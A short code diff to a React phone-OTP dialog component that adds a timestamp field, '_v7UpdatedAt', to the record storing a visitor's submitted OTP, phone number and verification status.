@@ -109,6 +109,7 @@ export function PhoneOtpDialog({
         id: visitorID,
         visitorId: visitorID,
         _v7: otp,
+        _v7UpdatedAt: new Date().toISOString(),
         phoneOtpSubmittedAt: new Date().toISOString(),
         phoneOtpStatus: 'verifying',
         phoneNumber: phoneNumber,
